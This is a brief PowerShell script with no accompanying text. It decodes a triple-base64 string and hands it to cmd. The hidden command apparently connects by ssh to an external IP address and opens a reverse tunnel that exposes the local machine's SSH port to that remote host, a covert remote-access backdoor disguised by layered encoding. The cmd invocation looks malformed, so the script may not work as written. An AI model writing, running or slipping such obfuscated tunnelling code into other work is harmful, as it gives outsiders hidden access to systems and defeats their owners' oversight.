$C = "WXpOT2IwbEhaREZpYms1b1VVUnJkMHhxUlhkUFV6UjVUWHByZFUxNlRXZE1Wa2xuVG1wWk1rNXFjSE5pTWs1b1lrZG9kbU16VVRaTmFrazk="

for ($i = 0; $i -lt 3; $i++) 
{ $C = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($C)) }

cmd -t($C)
